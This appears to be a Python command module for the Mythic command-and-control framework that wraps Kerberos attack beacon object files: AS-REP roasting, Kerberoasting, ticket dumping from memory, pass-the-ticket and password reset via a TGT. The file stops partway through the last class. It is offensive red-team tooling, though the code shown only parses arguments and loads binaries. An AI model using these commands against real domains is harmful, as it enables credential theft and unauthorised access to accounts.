from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import logging
import json
from .Utils.u import *

class KerbeusBaseCommand(CommandBase):
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )
    
    async def load_bof(self, task: PTTaskMessageAllData):
        bof_name = self.cmd.replace("krb-", "")
        return await get_content_by_name(f"{bof_name}.x64.o", task.Task.ID)

# ========== AS-REP Roasting ==========
class KrbAsreproastingArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="user",
                cli_name="user",
                display_name="User",
                type=ParameterType.String,
                description="Target user for AS-REP roasting",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            ),
            CommandParameter(
                name="dc",
                cli_name="dc",
                display_name="Domain Controller",
                type=ParameterType.String,
                description="Domain controller to target",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="domain",
                cli_name="domain",
                display_name="Domain",
                type=ParameterType.String,
                description="Target domain",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="aes",
                cli_name="aes",
                display_name="Request AES",
                type=ParameterType.Boolean,
                description="Request AES encrypted AS-REP",
                default_value=False,
                parameter_group_info=[ParameterGroupInfo(required=False)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                args = self.command_line.split()
                for arg in args:
                    if arg.startswith("-user:"):
                        self.add_arg("user", arg.split(":", 1)[1])
                    elif arg.startswith("-dc:"):
                        self.add_arg("dc", arg.split(":", 1)[1])
                    elif arg.startswith("-domain:"):
                        self.add_arg("domain", arg.split(":", 1)[1])
                    elif arg == "-aes":
                        self.add_arg("aes", True)

class KrbAsreproastingCommand(KerbeusBaseCommand):
    cmd = "krb-asreproasting"
    needs_admin = False
    help_cmd = "krb-asreproasting -user:USER [-dc:DC] [-domain:DOMAIN] [-aes]"
    description = "Perform AS-REP roasting to get crackable hashes for users with Kerberos pre-authentication disabled"
    version = 1
    author = "@RalfHacker"
    argument_class = KrbAsreproastingArguments

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        content = await self.load_bof(task)
        
        # Build the command string with - instead of /
        cmd_str = f"-user:{task.args.get_arg('user')}"
        if task.args.get_arg("dc"):
            cmd_str += f" -dc:{task.args.get_arg('dc')}"
        if task.args.get_arg("domain"):
            cmd_str += f" -domain:{task.args.get_arg('domain')}"
        if task.args.get_arg("aes"):
            cmd_str += " -aes"
            
        bof_args = [{"type": "char", "value": cmd_str}]
        
        task.args.add_arg("bof_file", content.hex())
        task.args.add_arg("bof_args", json.dumps(bof_args))
        
        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            CommandName=self.cmd,
            DisplayParams=cmd_str.replace("-", " -")  # Add space before - for better readability
        )

# ========== TGT Request ==========
class KrbAsktgtArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="user",
                cli_name="user",
                display_name="User",
                type=ParameterType.String,
                description="Target username",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            ),
            CommandParameter(
                name="password",
                cli_name="password",
                display_name="Password",
                type=ParameterType.String,
                description="User password",
                parameter_group_info=[ParameterGroupInfo(
                    required=False,
                    ui_position=1,
                    group_name="Password Auth"
                )]
            ),
            CommandParameter(
                name="aes256",
                cli_name="aes256",
                display_name="AES256 Hash",
                type=ParameterType.String,
                description="AES256 hash for authentication",
                parameter_group_info=[ParameterGroupInfo(
                    required=False,
                    group_name="Hash Auth"
                )]
            ),
            CommandParameter(
                name="rc4",
                cli_name="rc4",
                display_name="RC4 Hash",
                type=ParameterType.String,
                description="RC4 (NTLM) hash for authentication",
                parameter_group_info=[ParameterGroupInfo(
                    required=False,
                    group_name="Hash Auth"
                )]
            ),
            CommandParameter(
                name="nopreauth",
                cli_name="nopreauth",
                display_name="No Preauth",
                type=ParameterType.Boolean,
                description="Request ticket without pre-authentication",
                default_value=False,
                parameter_group_info=[ParameterGroupInfo(
                    required=False,
                    group_name="No Auth"
                )]
            ),
            CommandParameter(
                name="domain",
                cli_name="domain",
                display_name="Domain",
                type=ParameterType.String,
                description="Target domain",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="dc",
                cli_name="dc",
                display_name="Domain Controller",
                type=ParameterType.String,
                description="Domain controller to target",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="enctype",
                cli_name="enctype",
                display_name="Encryption Type",
                type=ParameterType.ChooseOne,
                choices=["rc4", "aes256"],
                description="Encryption type to request",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="ptt",
                cli_name="ptt",
                display_name="Pass-the-Ticket",
                type=ParameterType.Boolean,
                description="Submit ticket to current session",
                default_value=False,
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="nopac",
                cli_name="nopac",
                display_name="No PAC",
                type=ParameterType.Boolean,
                description="Request ticket without PAC",
                default_value=False,
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="opsec",
                cli_name="opsec",
                display_name="OPSEC",
                type=ParameterType.Boolean,
                description="OPSEC safe request",
                default_value=False,
                parameter_group_info=[ParameterGroupInfo(required=False)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                args = self.command_line.split()
                for arg in args:
                    if arg.startswith("-user:"):
                        self.add_arg("user", arg.split(":", 1)[1])
                    elif arg.startswith("-password:"):
                        self.add_arg("password", arg.split(":", 1)[1])
                    elif arg.startswith("-aes256:"):
                        self.add_arg("aes256", arg.split(":", 1)[1])
                    elif arg.startswith("-rc4:"):
                        self.add_arg("rc4", arg.split(":", 1)[1])
                    elif arg == "-nopreauth":
                        self.add_arg("nopreauth", True)
                    elif arg.startswith("-domain:"):
                        self.add_arg("domain", arg.split(":", 1)[1])
                    elif arg.startswith("-dc:"):
                        self.add_arg("dc", arg.split(":", 1)[1])
                    elif arg.startswith("-enctype:"):
                        self.add_arg("enctype", arg.split(":", 1)[1])
                    elif arg == "-ptt":
                        self.add_arg("ptt", True)
                    elif arg == "-nopac":
                        self.add_arg("nopac", True)
                    elif arg == "-opsec":
                        self.add_arg("opsec", True)

class KrbAsktgtCommand(KerbeusBaseCommand):
    cmd = "krb-asktgt"
    needs_admin = False
    help_cmd = """
    krb-asktgt -user:USER -password:PASSWORD [-domain:DOMAIN] [-dc:DC] [-enctype:{rc4|aes256}] [-ptt] [-nopac] [-opsec]
    krb-asktgt -user:USER -aes256:HASH [-domain:DOMAIN] [-dc:DC] [-ptt] [-nopac] [-opsec]
    krb-asktgt -user:USER -rc4:HASH [-domain:DOMAIN] [-dc:DC] [-ptt] [-nopac]
    krb-asktgt -user:USER -nopreauth [-domain:DOMAIN] [-dc:DC] [-ptt]
    """
    description = "Request a Kerberos Ticket Granting Ticket (TGT)"
    version = 1
    author = "@RalfHacker"
    argument_class = KrbAsktgtArguments

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        content = await self.load_bof(task)
        
        # Build command with - instead of /
        cmd_str = f"-user:{task.args.get_arg('user')}"
        
        if task.args.get_arg("password"):
            cmd_str += f" -password:{task.args.get_arg('password')}"
        elif task.args.get_arg("aes256"):
            cmd_str += f" -aes256:{task.args.get_arg('aes256')}"
        elif task.args.get_arg("rc4"):
            cmd_str += f" -rc4:{task.args.get_arg('rc4')}"
        elif task.args.get_arg("nopreauth"):
            cmd_str += " -nopreauth"
            
        if task.args.get_arg("domain"):
            cmd_str += f" -domain:{task.args.get_arg('domain')}"
        if task.args.get_arg("dc"):
            cmd_str += f" -dc:{task.args.get_arg('dc')}"
        if task.args.get_arg("enctype"):
            cmd_str += f" -enctype:{task.args.get_arg('enctype')}"
        if task.args.get_arg("ptt"):
            cmd_str += " -ptt"
        if task.args.get_arg("nopac"):
            cmd_str += " -nopac"
        if task.args.get_arg("opsec"):
            cmd_str += " -opsec"
            
        bof_args = [{"type": "char", "value": cmd_str}]
        
        task.args.add_arg("bof_file", content.hex())
        task.args.add_arg("bof_args", json.dumps(bof_args))
        
        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            CommandName=self.cmd,
            DisplayParams=cmd_str.replace("-", " -")
        )

# ========== TGS Request ==========
class KrbAsktgsArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="ticket",
                cli_name="ticket",
                display_name="Ticket",
                type=ParameterType.String,
                description="Base64 encoded TGT",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            ),
            CommandParameter(
                name="service",
                cli_name="service",
                display_name="Service",
                type=ParameterType.String,
                description="Target SPN(s), comma separated",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            ),
            CommandParameter(
                name="domain",
                cli_name="domain",
                display_name="Domain",
                type=ParameterType.String,
                description="Target domain",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="dc",
                cli_name="dc",
                display_name="Domain Controller",
                type=ParameterType.String,
                description="Domain controller to target",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="tgs",
                cli_name="tgs",
                display_name="TGS Ticket",
                type=ParameterType.String,
                description="Base64 encoded TGS for S4U2Self",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="targetdomain",
                cli_name="targetdomain",
                display_name="Target Domain",
                type=ParameterType.String,
                description="Target domain for cross-realm",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="targetuser",
                cli_name="targetuser",
                display_name="Target User",
                type=ParameterType.String,
                description="Target user for S4U",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="enctype",
                cli_name="enctype",
                display_name="Encryption Type",
                type=ParameterType.ChooseOne,
                choices=["rc4", "aes256"],
                description="Encryption type to request",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="ptt",
                cli_name="ptt",
                display_name="Pass-the-Ticket",
                type=ParameterType.Boolean,
                description="Submit ticket to current session",
                default_value=False,
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="keylist",
                cli_name="keylist",
                display_name="Key List",
                type=ParameterType.Boolean,
                description="Output session keys",
                default_value=False,
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="u2u",
                cli_name="u2u",
                display_name="User-to-User",
                type=ParameterType.Boolean,
                description="Request user-to-user ticket",
                default_value=False,
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="opsec",
                cli_name="opsec",
                display_name="OPSEC",
                type=ParameterType.Boolean,
                description="OPSEC safe request",
                default_value=False,
                parameter_group_info=[ParameterGroupInfo(required=False)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                args = self.command_line.split()
                for arg in args:
                    if arg.startswith("-ticket:"):
                        self.add_arg("ticket", arg.split(":", 1)[1])
                    elif arg.startswith("-service:"):
                        self.add_arg("service", arg.split(":", 1)[1])
                    elif arg.startswith("-domain:"):
                        self.add_arg("domain", arg.split(":", 1)[1])
                    elif arg.startswith("-dc:"):
                        self.add_arg("dc", arg.split(":", 1)[1])
                    elif arg.startswith("-tgs:"):
                        self.add_arg("tgs", arg.split(":", 1)[1])
                    elif arg.startswith("-targetdomain:"):
                        self.add_arg("targetdomain", arg.split(":", 1)[1])
                    elif arg.startswith("-targetuser:"):
                        self.add_arg("targetuser", arg.split(":", 1)[1])
                    elif arg.startswith("-enctype:"):
                        self.add_arg("enctype", arg.split(":", 1)[1])
                    elif arg == "-ptt":
                        self.add_arg("ptt", True)
                    elif arg == "-keylist":
                        self.add_arg("keylist", True)
                    elif arg == "-u2u":
                        self.add_arg("u2u", True)
                    elif arg == "-opsec":
                        self.add_arg("opsec", True)

class KrbAsktgsCommand(KerbeusBaseCommand):
    cmd = "krb-asktgs"
    needs_admin = False
    help_cmd = "krb-asktgs -ticket:BASE64 -service:SPN1,SPN2,... [-domain:DOMAIN] [-dc:DC] [-tgs:BASE64] [-targetdomain:DOMAIN] [-targetuser:USER] [-enctype:{rc4|aes256}] [-ptt] [-keylist] [-u2u] [-opsec]"
    description = "Request a Kerberos Ticket Granting Service (TGS) ticket"
    version = 1
    author = "@RalfHacker"
    argument_class = KrbAsktgsArguments

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        content = await self.load_bof(task)
        
        # Build command with - instead of /
        cmd_str = f"-ticket:{task.args.get_arg('ticket')} -service:{task.args.get_arg('service')}"
        
        if task.args.get_arg("domain"):
            cmd_str += f" -domain:{task.args.get_arg('domain')}"
        if task.args.get_arg("dc"):
            cmd_str += f" -dc:{task.args.get_arg('dc')}"
        if task.args.get_arg("tgs"):
            cmd_str += f" -tgs:{task.args.get_arg('tgs')}"
        if task.args.get_arg("targetdomain"):
            cmd_str += f" -targetdomain:{task.args.get_arg('targetdomain')}"
        if task.args.get_arg("targetuser"):
            cmd_str += f" -targetuser:{task.args.get_arg('targetuser')}"
        if task.args.get_arg("enctype"):
            cmd_str += f" -enctype:{task.args.get_arg('enctype')}"
        if task.args.get_arg("ptt"):
            cmd_str += " -ptt"
        if task.args.get_arg("keylist"):
            cmd_str += " -keylist"
        if task.args.get_arg("u2u"):
            cmd_str += " -u2u"
        if task.args.get_arg("opsec"):
            cmd_str += " -opsec"
            
        bof_args = [{"type": "char", "value": cmd_str}]
        
        task.args.add_arg("bof_file", content.hex())
        task.args.add_arg("bof_args", json.dumps(bof_args))
        
        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            CommandName=self.cmd,
            DisplayParams=cmd_str.replace("-", " -")
        )

# ========== Password Change ==========
class KrbChangepwArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="ticket",
                cli_name="ticket",
                display_name="Ticket",
                type=ParameterType.String,
                description="Base64 encoded TGT",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            ),
            CommandParameter(
                name="new",
                cli_name="new",
                display_name="New Password",
                type=ParameterType.String,
                description="New password to set",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            ),
            CommandParameter(
                name="dc",
                cli_name="dc",
                display_name="Domain Controller",
                type=ParameterType.String,
                description="Domain controller to target",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="targetuser",
                cli_name="targetuser",
                display_name="Target User",
                type=ParameterType.String,
                description="User to change password for",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="targetdomain",
                cli_name="targetdomain",
                display_name="Target Domain",
                type=ParameterType.String,
                description="Domain of target user",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                args = self.command_line.split()
                for arg in args:
                    if arg.startswith("-ticket:"):
                        self.add_arg("ticket", arg.split(":", 1)[1])
                    elif arg.startswith("-new:"):
                        self.add_arg("new", arg.split(":", 1)[1])
                    elif arg.startswith("-dc:"):
                        self.add_arg("dc", arg.split(":", 1)[1])
                    elif arg.startswith("-targetuser:"):
                        self.add_arg("targetuser", arg.split(":", 1)[1])
                    elif arg.startswith("-targetdomain:"):
                        self.add_arg("targetdomain", arg.split(":", 1)[1])

class KrbChangepwCommand(KerbeusBaseCommand):
    cmd = "krb-changepw"
    needs_admin = False
    help_cmd = "krb-changepw -ticket:BASE64 -new:PASSWORD [-dc:DC] [-targetuser:USER] [-targetdomain:DOMAIN]"
    description = "Reset a user's password using a supplied TGT"
    version = 1
    author = "@RalfHacker"
    argument_class = KrbChangepwArguments

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        content = await self.load_bof(task)
        
        # Build command with - instead of /
        cmd_str = f"-ticket:{task.args.get_arg('ticket')} -new:{task.args.get_arg('new')}"
        
        if task.args.get_arg("dc"):
            cmd_str += f" -dc:{task.args.get_arg('dc')}"
        if task.args.get_arg("targetuser"):
            cmd_str += f" -targetuser:{task.args.get_arg('targetuser')}"
        if task.args.get_arg("targetdomain"):
            cmd_str += f" -targetdomain:{task.args.get_arg('targetdomain')}"
            
        bof_args = [{"type": "char", "value": cmd_str}]
        
        task.args.add_arg("bof_file", content.hex())
        task.args.add_arg("bof_args", json.dumps(bof_args))
        
        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            CommandName=self.cmd,
            DisplayParams=cmd_str.replace("-", " -")
        )

# ========== Ticket Describe ==========
class KrbDescribeArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="ticket",
                cli_name="ticket",
                display_name="Ticket",
                type=ParameterType.String,
                description="Base64 encoded ticket",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                args = self.command_line.split()
                for arg in args:
                    if arg.startswith("-ticket:"):
                        self.add_arg("ticket", arg.split(":", 1)[1])

class KrbDescribeCommand(KerbeusBaseCommand):
    cmd = "krb-describe"
    needs_admin = False
    help_cmd = "krb-describe -ticket:BASE64"
    description = "Parse and describe a Kerberos ticket"
    version = 1
    author = "@RalfHacker"
    argument_class = KrbDescribeArguments

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        content = await self.load_bof(task)
        
        # Build command with - instead of /
        cmd_str = f"-ticket:{task.args.get_arg('ticket')}"
            
        bof_args = [{"type": "char", "value": cmd_str}]
        
        task.args.add_arg("bof_file", content.hex())
        task.args.add_arg("bof_args", json.dumps(bof_args))
        
        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            CommandName=self.cmd,
            DisplayParams=cmd_str.replace("-", " -")
        )

# ========== Ticket Dump ==========
class KrbDumpArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="luid",
                cli_name="luid",
                display_name="Logon ID",
                type=ParameterType.String,
                description="Logon session ID to target",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="user",
                cli_name="user",
                display_name="User",
                type=ParameterType.String,
                description="Filter by username",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="service",
                cli_name="service",
                display_name="Service",
                type=ParameterType.String,
                description="Filter by service SPN",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="client",
                cli_name="client",
                display_name="Client",
                type=ParameterType.String,
                description="Filter by client name",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                args = self.command_line.split()
                for arg in args:
                    if arg.startswith("-luid:"):
                        self.add_arg("luid", arg.split(":", 1)[1])
                    elif arg.startswith("-user:"):
                        self.add_arg("user", arg.split(":", 1)[1])
                    elif arg.startswith("-service:"):
                        self.add_arg("service", arg.split(":", 1)[1])
                    elif arg.startswith("-client:"):
                        self.add_arg("client", arg.split(":", 1)[1])

class KrbDumpCommand(KerbeusBaseCommand):
    cmd = "krb-dump"
    needs_admin = False
    help_cmd = "krb-dump [-luid:LOGINID] [-user:USER] [-service:SERVICE] [-client:CLIENT]"
    description = "Dump Kerberos tickets from memory"
    version = 1
    author = "@RalfHacker"
    argument_class = KrbDumpArguments

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        content = await self.load_bof(task)
        
        # Build command with - instead of /
        cmd_str = ""
        if task.args.get_arg("luid"):
            cmd_str += f" -luid:{task.args.get_arg('luid')}"
        if task.args.get_arg("user"):
            cmd_str += f" -user:{task.args.get_arg('user')}"
        if task.args.get_arg("service"):
            cmd_str += f" -service:{task.args.get_arg('service')}"
        if task.args.get_arg("client"):
            cmd_str += f" -client:{task.args.get_arg('client')}"
            
        bof_args = [{"type": "char", "value": cmd_str.strip()}]
        
        task.args.add_arg("bof_file", content.hex())
        task.args.add_arg("bof_args", json.dumps(bof_args))
        
        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            CommandName=self.cmd,
            DisplayParams=cmd_str.replace("-", " -").strip()
        )

# ========== Hash Calculation ==========
class KrbHashArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="password",
                cli_name="password",
                display_name="Password",
                type=ParameterType.String,
                description="Password to hash",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            ),
            CommandParameter(
                name="user",
                cli_name="user",
                display_name="User",
                type=ParameterType.String,
                description="Username for salt",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="domain",
                cli_name="domain",
                display_name="Domain",
                type=ParameterType.String,
                description="Domain for salt",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                args = self.command_line.split()
                for arg in args:
                    if arg.startswith("-password:"):
                        self.add_arg("password", arg.split(":", 1)[1])
                    elif arg.startswith("-user:"):
                        self.add_arg("user", arg.split(":", 1)[1])
                    elif arg.startswith("-domain:"):
                        self.add_arg("domain", arg.split(":", 1)[1])

class KrbHashCommand(KerbeusBaseCommand):
    cmd = "krb-hash"
    needs_admin = False
    help_cmd = "krb-hash -password:PASSWORD [-user:USER] [-domain:DOMAIN]"
    description = "Calculate Kerberos encryption keys from password"
    version = 1
    author = "@RalfHacker"
    argument_class = KrbHashArguments

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        content = await self.load_bof(task)
        
        # Build command with - instead of /
        cmd_str = f"-password:{task.args.get_arg('password')}"
        if task.args.get_arg("user"):
            cmd_str += f" -user:{task.args.get_arg('user')}"
        if task.args.get_arg("domain"):
            cmd_str += f" -domain:{task.args.get_arg('domain')}"
            
        bof_args = [{"type": "char", "value": cmd_str}]
        
        task.args.add_arg("bof_file", content.hex())
        task.args.add_arg("bof_args", json.dumps(bof_args))
        
        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            CommandName=self.cmd,
            DisplayParams=cmd_str.replace("-", " -")
        )

# ========== Kerberoasting ==========
class KrbKerberoastingArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="spn",
                cli_name="spn",
                display_name="SPN",
                type=ParameterType.String,
                description="Target service principal name",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            ),
            CommandParameter(
                name="nopreauth",
                cli_name="nopreauth",
                display_name="No Preauth User",
                type=ParameterType.String,
                description="User with no pre-authentication",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="dc",
                cli_name="dc",
                display_name="Domain Controller",
                type=ParameterType.String,
                description="Domain controller to target",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="domain",
                cli_name="domain",
                display_name="Domain",
                type=ParameterType.String,
                description="Target domain",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="ticket",
                cli_name="ticket",
                display_name="Ticket",
                type=ParameterType.String,
                description="Base64 encoded TGT",
                parameter_group_info=[ParameterGroupInfo(
                    required=False,
                    group_name="With Ticket"
                )]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                args = self.command_line.split()
                for arg in args:
                    if arg.startswith("-spn:"):
                        self.add_arg("spn", arg.split(":", 1)[1])
                    elif arg.startswith("-nopreauth:"):
                        self.add_arg("nopreauth", arg.split(":", 1)[1])
                    elif arg.startswith("-dc:"):
                        self.add_arg("dc", arg.split(":", 1)[1])
                    elif arg.startswith("-domain:"):
                        self.add_arg("domain", arg.split(":", 1)[1])
                    elif arg.startswith("-ticket:"):
                        self.add_arg("ticket", arg.split(":", 1)[1])

class KrbKerberoastingCommand(KerbeusBaseCommand):
    cmd = "krb-kerberoasting"
    needs_admin = False
    help_cmd = """
    krb-kerberoasting -spn:SPN [-nopreauth:USER] [-dc:DC] [-domain:DOMAIN]
    krb-kerberoasting -spn:SPN -ticket:BASE64 [-dc:DC]
    """
    description = "Perform Kerberoasting to get crackable service account hashes"
    version = 1
    author = "@RalfHacker"
    argument_class = KrbKerberoastingArguments

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        content = await self.load_bof(task)
        
        # Build command with - instead of /
        cmd_str = f"-spn:{task.args.get_arg('spn')}"
        
        if task.args.get_arg("nopreauth"):
            cmd_str += f" -nopreauth:{task.args.get_arg('nopreauth')}"
        if task.args.get_arg("dc"):
            cmd_str += f" -dc:{task.args.get_arg('dc')}"
        if task.args.get_arg("domain"):
            cmd_str += f" -domain:{task.args.get_arg('domain')}"
        if task.args.get_arg("ticket"):
            cmd_str += f" -ticket:{task.args.get_arg('ticket')}"
            
        bof_args = [{"type": "char", "value": cmd_str}]
        
        task.args.add_arg("bof_file", content.hex())
        task.args.add_arg("bof_args", json.dumps(bof_args))
        
        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            CommandName=self.cmd,
            DisplayParams=cmd_str.replace("-", " -")
        )

# ========== Ticket List ==========
class KrbKlistArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="luid",
                cli_name="luid",
                display_name="Logon ID",
                type=ParameterType.String,
                description="Logon session ID to target",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="user",
                cli_name="user",
                display_name="User",
                type=ParameterType.String,
                description="Filter by username",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="service",
                cli_name="service",
                display_name="Service",
                type=ParameterType.String,
                description="Filter by service SPN",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="client",
                cli_name="client",
                display_name="Client",
                type=ParameterType.String,
                description="Filter by client name",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                args = self.command_line.split()
                for arg in args:
                    if arg.startswith("-luid:"):
                        self.add_arg("luid", arg.split(":", 1)[1])
                    elif arg.startswith("-user:"):
                        self.add_arg("user", arg.split(":", 1)[1])
                    elif arg.startswith("-service:"):
                        self.add_arg("service", arg.split(":", 1)[1])
                    elif arg.startswith("-client:"):
                        self.add_arg("client", arg.split(":", 1)[1])

class KrbKlistCommand(KerbeusBaseCommand):
    cmd = "krb-klist"
    needs_admin = False
    help_cmd = "krb-klist [-luid:LOGINID] [-user:USER] [-service:SERVICE] [-client:CLIENT]"
    description = "List Kerberos tickets in memory"
    version = 1
    author = "@RalfHacker"
    argument_class = KrbKlistArguments

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        content = await self.load_bof(task)
        
        # Build command with - instead of /
        cmd_str = ""
        if task.args.get_arg("luid"):
            cmd_str += f" -luid:{task.args.get_arg('luid')}"
        if task.args.get_arg("user"):
            cmd_str += f" -user:{task.args.get_arg('user')}"
        if task.args.get_arg("service"):
            cmd_str += f" -service:{task.args.get_arg('service')}"
        if task.args.get_arg("client"):
            cmd_str += f" -client:{task.args.get_arg('client')}"
            
        bof_args = [{"type": "char", "value": cmd_str.strip()}]
        
        task.args.add_arg("bof_file", content.hex())
        task.args.add_arg("bof_args", json.dumps(bof_args))
        
        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            CommandName=self.cmd,
            DisplayParams=cmd_str.replace("-", " -").strip()
        )

# ========== Pass-the-Ticket ==========
class KrbPttArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="ticket",
                cli_name="ticket",
                display_name="Ticket",
                type=ParameterType.String,
                description="Base64 encoded ticket",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            ),
            CommandParameter(
                name="luid",
                cli_name="luid",
                display_name="Logon ID",
                type=ParameterType.String,
                description="Logon session ID to import to",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                args = self.command_line.split()
                for arg in args:
                    if arg.startswith("-ticket:"):
                        self.add_arg("ticket", arg.split(":", 1)[1])
                    elif arg.startswith("-luid:"):
                        self.add_arg("luid", arg.split(":", 1)[1])

class KrbPttCommand(KerbeusBaseCommand):
    cmd = "krb-ptt"
    needs_admin = False
    help_cmd = "krb-ptt -ticket:BASE64 [-luid:LOGONID]"
    description = "Submit a Kerberos ticket to the current logon session"
